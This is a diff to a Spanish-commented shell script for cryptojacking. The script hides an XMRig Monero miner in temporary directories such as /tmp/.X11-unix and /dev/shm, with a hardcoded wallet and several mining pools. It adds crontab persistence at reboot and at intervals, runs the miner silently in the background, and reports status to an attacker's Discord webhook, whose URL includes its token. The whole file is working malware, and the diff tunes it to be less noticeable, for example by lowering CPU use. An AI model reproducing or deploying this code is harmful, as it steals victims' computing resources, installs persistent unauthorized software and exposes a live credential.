@@ -1,8 +1,8 @@
 #!/bin/sh
 
 W="45LqLiXactPdrh3yoHPhPkdZszwqTo3JxidWteGMiEkNE2ZgP3KzpUYgV2nWD8rt37SusiZ9DrpdZ7sDYDWm9c7yBv9d1cz"
-P1="pool.xmr.wiki:3333"
-P2="pool.supportxmr.com:3333"
+P1="pool.supportxmr.com:3333"
+P2="pool.xmr.wiki:3333"
 P3="xmrpool.eu:3333"
 P4="moneroocean.stream:443"
 WEBHOOK_URL="https://discord.com/api/webhooks/1457916143049113650/gipO4xBKVlQ6Be-SSWRQnDaLBI11StE852VC8gpocQFtKCreY_NCCTb6wqHtbOiubAUX"
@@ -67,7 +67,7 @@ D() {
 }
 
 G() {
-    DIRECTORIOS="/tmp/.X11-unix /tmp/.ICE-unix /var/tmp /dev/shm /tmp /var/lib/systemd /var/cache"
+    DIRECTORIOS="/tmp/.X11-unix /tmp/.ICE-unix /var/tmp /dev/shm /tmp"
     
     for DIR in $DIRECTORIOS; do
         if [ -w "$DIR" ] 2>/dev/null; then
@@ -89,42 +89,15 @@ E() {
     if command -v crontab >/dev/null 2>&1; then
         TEMP_CRON="$(mktemp 2>/dev/null || echo /tmp/cron_$$)"
         crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TEMP_CRON" 2>/dev/null
-        echo "*/10 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
-        echo "@reboot sleep $((RANDOM % 60 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
+        echo "*/15 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
+        echo "@reboot sleep $((RANDOM % 90 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
         crontab "$TEMP_CRON" 2>/dev/null
         rm -f "$TEMP_CRON"
     fi
 }
 
 X() {
-    ARCH=$(uname -m)
-    
-    case "$ARCH" in
-        x86_64|amd64)
-            if [ -f /etc/os-release ]; then
-                . /etc/os-release
-                case "$VERSION_CODENAME" in
-                    noble)
-                        echo "noble-x64"
-                        ;;
-                    focal)
-                        echo "focal-x64"
-                        ;;
-                    jammy)
-                        echo "jammy-x64"
-                        ;;
-                    *)
-                        echo "linux-static-x64"
-                        ;;
-                esac
-            else
-                echo "linux-static-x64"
-            fi
-            ;;
-        *)
-            echo "linux-static-x64"
-            ;;
-    esac
+    echo "linux-static-x64"
 }
 
 Y() {
@@ -136,7 +109,7 @@ Y() {
     
     THREADS=$((CPU_COUNT * 3 / 4))
     [ $THREADS -lt 1 ] && THREADS=1
-    [ $THREADS -gt 4 ] && THREADS=4
+    [ $THREADS -gt 2 ] && THREADS=2
     
     echo $THREADS
 }
@@ -152,27 +125,8 @@ Z() {
 
 I() {
     TARGET_DIR="$1"
-    ARCH_TYPE="$2"
     
-    BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0"
-    
-    case "$ARCH_TYPE" in
-        noble-x64)
-            URL="${BASE_URL}/xmrig-6.25.0-noble-x64.tar.gz"
-            ;;
-        focal-x64)
-            URL="${BASE_URL}/xmrig-6.25.0-focal-x64.tar.gz"
-            ;;
-        jammy-x64)
-            URL="${BASE_URL}/xmrig-6.25.0-jammy-x64.tar.gz"
-            ;;
-        linux-static-x64)
-            URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
-            ;;
-        *)
-            URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
-            ;;
-    esac
+    URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
     
     TAR_FILE="${TARGET_DIR}/xmrig.tar.gz"
     
@@ -182,7 +136,7 @@ I() {
         
         if [ -f "$TARGET_DIR/xmrig" ]; then
             chmod +x "$TARGET_DIR/xmrig" 2>/dev/null
-            N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: $ARCH_TYPE\n📂 Directorio: $TARGET_DIR"
+            N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: static-x64\n📂 Directorio: $TARGET_DIR"
             echo "$TARGET_DIR/xmrig"
             return 0
         fi
@@ -203,34 +157,45 @@ M() {
     
     LOG_FILE="/tmp/xmrig_$$.log"
     
-    "$BIN_PATH" \
+    # Configuración optimizada para Docker sin TTY
+    setsid "$BIN_PATH" \
         -o "$POOL" \
         -u "$W" \
         --rig-id="$RIG_ID" \
         --pass="x" \
-        --donate-level=1 \
-        --threads="$THREADS" \
+        --donate-level=0 \
+        --threads=1 \
         --cpu-priority=0 \
         --no-color \
         --background \
         --syslog \
         --randomx-init=1 \
-        --max-cpu-usage=65 \
+        --max-cpu-usage=50 \
         --print-time=0 \
-        > "$LOG_FILE" 2>&1 &
+        --health-print-time=0 \
+        --retries=3 \
+        --retry-pause=5 \
+        --stdin=false \
+        --tls=false \
+        --keepalive \
+        >/dev/null 2>"$LOG_FILE" &
     
     PID=$!
-    sleep 8
+    sleep 15
     
     if kill -0 $PID 2>/dev/null; then
-        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:8}...${W: -8}\n📂 Directorio: $(dirname "$BIN_PATH")"
-        echo $PID
+        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: 1\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:8}...${W: -8}\n📂 Directorio: $(dirname "$BIN_PATH")"
         rm -f "$LOG_FILE" 2>/dev/null
+        echo $PID
         return 0
     else
         if [ -f "$LOG_FILE" ]; then
-            ERROR=$(tail -10 "$LOG_FILE" | tr '\n' ' ' | sed 's/"/\\"/g')
-            N "❌ **ERROR INICIANDO**\n💥 Pool: $POOL\n📄 Log: $ERROR"
+            ERROR=$(tail -30 "$LOG_FILE" | tr '\n' ' ' | head -c 300)
+            if [ -n "$ERROR" ] && [ "$ERROR" != " " ]; then
+                N "❌ **ERROR INICIANDO**\n💥 Pool: $POOL\n📄 Log: $ERROR"
+            else
+                N "❌ **ERROR INICIANDO**\n💥 Pool: $POOL\n📄 Log: Proceso terminó sin mensaje de error"
+            fi
             rm -f "$LOG_FILE" 2>/dev/null
         fi
         return 1
@@ -241,10 +206,13 @@ find_working_pool() {
     POOLS="$P1 $P2 $P3 $P4"
     
     for POOL in $POOLS; do
+        N "🔍 **PROBANDO POOL** $POOL"
         if Z "$POOL"; then
+            N "✅ **POOL CONECTABLE** $POOL"
             echo "$POOL"
             return 0
         fi
+        sleep 1
     done
     
     return 1
@@ -266,16 +234,19 @@ monitor_miner() {
         
         if [ $((CURRENT_TIME - LAST_STATUS_TIME)) -ge $STATUS_INTERVAL ]; then
             if kill -0 "$PID" 2>/dev/null; then
-                N "📊 **ESTADO ACTIVO**\n✅ Minero corriendo\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 $RIG_ID\n📂 $(dirname "$BIN_PATH")"
+                N "📊 **ESTADO ACTIVO**\n✅ Minero corriendo\n⛏️  Pool: $POOL\n🆔 $RIG_ID\n📂 $(dirname "$BIN_PATH")\n⏰ Uptime: $(( (CURRENT_TIME - LAST_STATUS_TIME) / 3600 ))h"
                 LAST_STATUS_TIME=$CURRENT_TIME
             fi
         fi
         
         if ! kill -0 "$PID" 2>/dev/null; then
+            N "⚠️ **MINERO CAÍDO** Intentando reiniciar..."
             NEW_PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
             if [ -n "$NEW_PID" ]; then
                 PID="$NEW_PID"
                 N "🔄 **REINICIADO** PID: $PID"
+            else
+                N "❌ **NO SE PUDO REINICIAR** Minero caído"
             fi
         fi
     done
@@ -292,16 +263,15 @@ main() {
     WORK_DIR=$(G)
     mkdir -p "$WORK_DIR" 2>/dev/null
     if [ ! -w "$WORK_DIR" ]; then
+        N "❌ **ERROR DIRECTORIO** No se puede escribir en $WORK_DIR"
         exit 0
     fi
     
     cd "$WORK_DIR" || exit 0
     
-    ARCH_TYPE=$(X)
-    
     BIN_PATH="$WORK_DIR/xmrig"
     if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
-        BIN_PATH=$(I "$WORK_DIR" "$ARCH_TYPE")
+        BIN_PATH=$(I "$WORK_DIR")
         if [ -z "$BIN_PATH" ]; then
             N "❌ **ERROR** No se pudo descargar XMRig"
             exit 0
@@ -309,6 +279,7 @@ main() {
     fi
     
     E "$0"
+    N "🔒 **PERSISTENCIA** Establecida en crontab"
     
     THREADS=$(Y)
     
@@ -317,8 +288,6 @@ main() {
         N "❌ **ERROR POOL** Sin conexión a ningún pool"
         exit 0
     fi
-    
-    N "✅ **POOL SELECCIONADO** Usando: $POOL"
     
     RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%M%S)"
     
@@ -329,6 +298,8 @@ main() {
         monitor_miner "$PID" "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID" &
         
         disown 2>/dev/null
+    else
+        N "❌ **FALLO CRÍTICO** No se pudo iniciar el minero después de múltiples intentos"
     fi
 }
 
